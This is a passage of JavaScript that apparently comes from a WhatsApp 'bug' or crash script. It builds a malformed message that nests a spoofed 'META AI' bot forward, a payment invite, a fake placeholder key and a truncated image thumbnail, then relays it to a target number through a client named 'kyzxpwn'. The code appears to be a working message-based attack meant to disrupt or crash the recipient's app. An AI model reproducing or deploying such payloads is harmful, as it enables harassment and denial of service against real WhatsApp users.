                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: " X ",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
  };

  const message = await (async () => {
    try {
      return generateWAMessageFromContent(
        isTarget,
        payload,
        {}
      );
    } catch (e) {
      console.error("Error generating message payload:", e);
    }
  })();

  if (message) {
    await kyzxpwn.relayMessage(
      isTarget,
      message.message,
      { messageId: message.key.id }
    );
  }
} catch (e) {
    console.error("❌ Error kirim message:", e);
  }
}